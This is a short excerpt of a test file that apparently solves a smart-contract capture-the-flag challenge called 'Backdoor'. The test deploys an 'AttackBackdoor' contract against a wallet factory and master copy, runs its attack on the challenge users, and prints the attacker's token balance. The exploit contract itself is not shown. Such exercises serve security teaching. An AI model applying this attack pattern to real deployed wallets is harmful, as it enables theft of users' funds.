...
describe('[Challenge] Backdoor', function () {
    ...
    it('Exploit', async function () {
        ...
        this.attackBackdoor = await (await ethers.getContractFactory('AttackBackdoor', attacker)).deploy(
            attacker.address,
            this.walletFactory.address,
            this.masterCopy.address,
        ...
        await this.attackBackdoor.connect(attacker).attack(users);

        const tokenBal = await this.token.balanceOf(attacker.address);
        console.log(`Token attacker balance:`, ethers.utils.formatEther(tokenBal));
    });
